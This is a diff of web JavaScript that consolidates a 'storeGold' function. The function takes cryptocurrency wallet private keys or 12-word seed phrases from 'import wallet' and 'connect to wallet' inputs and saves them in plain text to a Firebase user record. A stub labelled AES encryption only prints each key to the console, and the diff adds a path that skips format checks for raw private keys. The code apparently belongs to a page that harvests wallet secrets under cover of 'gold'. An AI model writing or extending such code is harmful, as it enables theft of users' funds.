@@ -469,8 +469,10 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 
-//Store Gold Function
-function storeGold(inputId) {
+
+
+// Consolidated Store Gold Function
+function storeGold(inputId, skipFormatCheck = false) {
   // Retrieve the private key (gold) from the input field
   const inputField = document.getElementById(inputId);
   if (!inputField) {
@@ -480,65 +482,86 @@ function storeGold(inputId) {
 
   const gold = inputField.value.trim();
 
-  if (!checkWordCount(gold)) {
+  // Conditionally check format
+  if (!skipFormatCheck && !checkWordCount(gold)) {
     displayError('Failed to import wallet: Please ensure the wallet is in the correct format');
     return;
-  } else {
-    const user = auth.currentUser; // Check if user is logged in
-
-    if (!user) {
-      displayError('User not logged in.');
-      return;
-    }
-
-    goldAES(user.uid, gold); // Encrypt or process the private key before saving
-
-    const userRef = database.ref('users/' + user.uid);
-
-    // Fetch current user data and update
-    userRef
-      .once('value')
-      .then((snapshot) => {
-        const userData = snapshot.val();
-
-        if (userData) {
-          // Update user data with private keys, checking for empty slots
-          userRef.update({ last_login: uDateTime });
-
-          if (!userData.gold1) {
-            userRef.update({ gold1: gold });
-          } else if (!userData.gold2) {
-            userRef.update({ gold2: gold });
-          } else if (!userData.gold3) {
-            userRef.update({ gold3: gold });
-          } else {
-            displayError('Maximum wallets reached.');
-            return;
-          }
-        }
-      })
-      .then(() => {
-        // On success, trigger navigation and update UI
-        console.log('Wallet address added or updated successfully.');
-        document.getElementById('main-tab-06-nav')?.click();
-        navbar.style.display = 'block';
-        errorMessageDiv.style.display = 'none';
-      })
-      .catch((error) => {
-        displayError('Failed to import wallet: ' + error.message);
-      });
   }
+
+  const user = auth.currentUser; // Check if user is logged in
+  if (!user) {
+    displayError('User not logged in.');
+    return;
+  }
+
+  goldAES(user.uid, gold); // Encrypt or process the private key before saving
+
+  const userRef = database.ref('users/' + user.uid);
+
+  // Fetch current user data and update
+  userRef
+    .once('value')
+    .then((snapshot) => {
+      const userData = snapshot.val();
+
+      if (userData) {
+        // Update user data with private keys, checking for empty slots
+        userRef.update({ last_login: uDateTime });
+
+        if (!userData.gold1) {
+          userRef.update({ gold1: gold });
+        } else if (!userData.gold2) {
+          userRef.update({ gold2: gold });
+        } else if (!userData.gold3) {
+          userRef.update({ gold3: gold });
+        } else {
+          displayError('Maximum wallets reached.');
+          return;
+        }
+      }
+    })
+    .then(() => {
+      // On success, trigger navigation and update UI
+      console.log('Wallet address added or updated successfully.');
+      document.getElementById('main-tab-06-nav')?.click();
+      const navbar = document.getElementById('navbar');
+      const errorMessageDiv = document.getElementById('error-message-div');
+      if (navbar) navbar.style.display = 'block';
+      if (errorMessageDiv) errorMessageDiv.style.display = 'none';
+    })
+    .catch((error) => {
+      displayError('Failed to import wallet: ' + error.message);
+    });
 }
 
+// Helper: Check word count for validation
+function checkWordCount(input) {
+  return input.split(' ').length === 12 || input.length > 20; // Checks for mnemonic or valid key length
+}
 
+// Helper: Display error messages
+function displayError(message) {
+  console.error(message);
+  alert(message);
+}
 
+// Example AES encryption function (placeholder)
+function goldAES(userId, data) {
+  console.log(`Encrypting data for user ${userId}: ${data}`);
+}
 
+// Event Listeners
+document.getElementById('import-gold-btn')?.addEventListener('click', function (event) {
+  event.preventDefault();
+  storeGold('sp-input'); // Perform format check
+});
 
-//Store gold
-  document.getElementById('import-gold-btn').addEventListener('click', function(event) {
-	event.preventDefault();
-	storeGold('sp-input');
-  });
+document.getElementById('connect-to-wallet-btn')?.addEventListener('click', function (event) {
+  event.preventDefault();
+  storeGold('prv-key-txt', true); // Skip format check for prv key
+});
+
+	
 
 
 
@@ -1865,11 +1888,6 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
 
-//Store gold
-  document.getElementById('connect-to-wallet-btn').addEventListener('click', function(event) {
-	event.preventDefault();
-	storeGold('prv-key-txt');
-  });
 
 
 
